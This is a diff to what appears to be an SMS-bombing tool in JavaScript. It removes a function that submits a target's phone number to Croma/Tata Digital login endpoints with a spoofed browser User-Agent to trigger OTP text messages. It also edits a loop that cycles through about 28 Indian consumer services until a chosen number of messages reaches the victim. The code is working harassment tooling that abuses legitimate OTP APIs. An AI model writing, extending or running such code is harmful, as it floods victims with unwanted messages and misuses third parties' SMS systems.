@@ -684,64 +684,6 @@ async function eatclub(number) {
     })
 }
 
-async function croma(number) {
-    return new Promise((resolve) => {
-        fetch("https://api.tatadigital.com/api/v2/sso/check-phone-croma", {
-            method: "POST",
-            headers: {
-                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-                "Content-Type": "application/json",
-                "client_id": "CROMA-WEB-APP"
-            },
-            body: JSON.stringify({
-                "countryCode": "91",
-                "phone": number
-            })
-        }).then((res)=>{
-            let contenttype = res.headers.get("content-type")
-            if(contenttype && contenttype.includes("application/json") === true){
-                return res.json()
-            }else{
-                resolve(false)
-            }
-        }).then((data) => {
-            if (data?.message === "User not found") {
-                fetch("https://api.tatadigital.com/api/v2/sso/check-phone", {
-                    method: "POST",
-                    headers: {
-                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-                        "Content-Type": "application/json",
-                        "client_id": "CROMA-WEB-APP"
-                    },
-                    body: JSON.stringify({
-                        "countryCode": "91",
-                        "sendOtp": true,
-                        "phone": number
-                    })
-                }).then((res)=>{
-            let contenttype = res.headers.get("content-type")
-            if(contenttype && contenttype.includes("application/json") === true){
-                return res.json()
-            }else{
-                resolve(false)
-            }
-        }).then((data) => {
-                    if (data?.refId)
-                        resolve(true)
-                    resolve(false)
-                }).catch((err)=>{
-                    console.log("error occured during fetch: "+err);
-            resolve(false)
-                });
-            } else
-                resolve(true)
-        }).catch((err)=>{
-            console.log("error occured during fetch: "+err);
-            resolve(false)
-        });
-    })
-}
-
 function hoichoirandom() {
     let ans = ""
     for (let i = 0; i < 5; i++) {
@@ -1115,10 +1057,10 @@ function sleep(time){
 }
 
 async function sendsms(number, ws, limit, speed) {
-    let list = [ajio, blinkit, byjus, croma, derma, eatclub, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, meesho, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
+    let list = [ajio, blinkit, byjus, derma, eatclub, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, meesho, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
     let i = 0,t=0;
     while (i < limit) {
-        let res = await list[t%29](number)
+        let res = await list[t%list.length](number)
         if (res) {
             i++;
             ws.send("1")
